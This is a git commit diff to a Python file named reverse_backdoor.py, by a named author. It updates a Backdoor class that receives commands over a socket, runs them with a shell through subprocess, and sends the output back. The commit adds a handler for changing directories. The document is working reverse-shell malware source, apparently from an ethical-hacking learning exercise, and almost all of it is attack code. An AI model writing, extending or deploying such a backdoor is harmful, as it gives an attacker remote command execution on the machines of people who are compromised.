7c34109d9b7bd0d8dc35ca99e352be685590f0c4
Shahrukh <tramboos123@gmail.com>
2021-01-29 21:05:40 +0530

    Update reverse_backdoor.py

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,5 +1,5 @@
 import socket
-import subprocess, json
+import subprocess, json, os
 
 
 class Backdoor:
@@ -24,14 +24,20 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def change_working_directory_to(self, path):
+    	os.chdir(path)
+    	return "[+] Changing working directory to " + path
+
     def run(self):
         while True:
             command = self.reliable_recv()
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-
-            command_result = self.execute_system_command(command)
+            elif command[0] == "cd" and len(command) > 1:
+            	command_result = self.change_working_directory_to(command[1])
+            else:
+            	command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
 
 
